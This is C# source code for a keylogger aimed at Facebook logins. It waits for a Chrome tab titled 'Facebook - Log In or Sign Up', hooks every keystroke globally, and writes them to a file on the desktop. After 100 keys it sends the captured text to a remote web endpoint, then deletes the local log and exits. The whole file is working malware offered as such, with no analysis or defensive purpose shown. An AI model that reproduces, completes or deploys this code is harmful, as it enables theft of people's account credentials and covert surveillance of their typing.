using Gma.System.MouseKeyHook;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Automation;
using System.Windows.Forms;

namespace KeyLogger
{
    class Program
    {

        public static int counter = 0;
        public static string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"//logs.txt";
        static IKeyboardMouseEvents hook = Hook.GlobalEvents();
        static void Main(string[] args)
        {
            //Thread TSender = new Thread(SenderThread);
            //TSender.Start();
            //var hook = Hook.GlobalEvents();



            hook.KeyPress += Hook_KeyPress; //start logging

            ChromeRunning();

        }

        private static void Hook_KeyPress(object sender, System.Windows.Forms.KeyPressEventArgs e)
        {
            counter++;

            if (e.KeyChar != ' ')
                Log(e.KeyChar.ToString());

            else
                Log(' '.ToString());

            if (counter == 100)
            {
                hook.Dispose();
                SenderThread();
            }

        }
        //default path for log.txt
        //--> KeyLogger\KeyLogger\bin\Debug\logs.txt
        private static void Log(string log)
        {
            if (File.Exists(folderPath))
                File.AppendAllText(folderPath, log);

        }


        private static async void SenderThread()
        {

            //string LoggedInfo = "";
            var logger = new Logger();
            logger.LoggedInfo = "";

            if (File.Exists(folderPath))
            {
                logger.LoggedInfo = File.ReadAllText(folderPath);
            }



            var response = await SendLoggedInfo.SendInfo("https://blogsbeforebed.com/api/email/logger", logger); //save it in db
            if (!response.ToLower().Contains("not"))
            {
                if (File.Exists(folderPath))
                {
                    File.Delete(folderPath);
                    Application.Exit();
                }
            }
        }

        private static void ChromeRunning()
        {
            var procs = Process.GetProcesses();
            bool found = false;
            foreach (var proc in procs)
            {
                if ("chrome" == proc.ProcessName)
                {

                    found = true;
                    //return !found;
                }

            }
            if (found)//Chrome process exists
            {
                if (CheckTab()) //if Facebook Login page is open.
                {
                    Application.Run();

                }
            }

        }

        private static bool CheckTab()
        {
            Process[] procsChrome = Process.GetProcessesByName("chrome");
            if (procsChrome.Length <= 0)
            {
                return false;
            }
            else
            {
                foreach (Process proc in procsChrome)
                {
                    if (proc.MainWindowHandle == IntPtr.Zero)
                    {
                        continue;
                    }
                    bool finder = true;
                    // to find the tabs we first need to locate something reliable - the 'New Tab' button 
                    AutomationElement root = AutomationElement.FromHandle(proc.MainWindowHandle);
                    Condition condNewTab = new PropertyCondition(AutomationElement.NameProperty, "Facebook - Log In or Sign Up"); //facebook login signup

                    AutomationElement elmNewTab = root.FindFirst(TreeScope.Descendants, condNewTab);
                    while (finder)
                    {
                        try
                        {
                            elmNewTab = root.FindFirst(TreeScope.Descendants, condNewTab);
                            if (elmNewTab != null)
                                finder = false;
                        }
                        catch (Exception ex)
                        {
                            var msg = ex.Message;
                        }
                        Thread.Sleep(1000);
                    }
                    // get the tabstrip by getting the parent of the 'new tab' button 
                    TreeWalker treewalker = TreeWalker.ControlViewWalker;
                    AutomationElement elmTabStrip = treewalker.GetParent(elmNewTab);
                    // loop through all the tabs and get the names which is the page title 
                    Condition condTabItem = new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.TabItem);
                    foreach (AutomationElement tabitem in elmTabStrip.FindAll(TreeScope.Children, condTabItem))
                    {
                        if (tabitem.Current.Name.Contains("Facebook"))
                        {

                            File.Create(folderPath).Close();
                            return true;
                        }
                    }

                    Thread.Sleep(50);
                }
                return false;
            }
        }



    }
}
